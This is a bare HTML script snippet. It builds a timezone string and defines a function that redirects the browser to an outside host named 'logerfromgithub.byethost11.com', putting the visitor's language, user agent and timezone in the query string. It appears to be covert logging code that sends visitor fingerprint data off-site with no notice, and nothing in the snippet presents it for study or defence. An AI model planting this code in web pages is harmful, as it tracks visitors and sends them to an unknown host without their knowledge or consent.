<script>
function tzone() {
      var rightNow, myNumber, formattedNumber, result;
        rightNow = new Date();
        myNumber = String(-(rightNow.getTimezoneOffset() / 60));
        if (myNumber < 0) {
            myNumber = myNumber * -1;
            formattedNumber = ("0" + myNumber).slice(-2);
            result = "-" + formattedNumber;
        } else {
            formattedNumber = ("0" + myNumber).slice(-2);
            result = "+" + formattedNumber;
        }
        return result;
    };
function abb(){
window.location = "http://logerfromgithub.byethost11.com?systemlang='"+(navigator.systemLanguage || window.navigator.language)+"'&ua='"+navigator.userAgent+"'&tz='"+tzone()+"'";
};
</script>
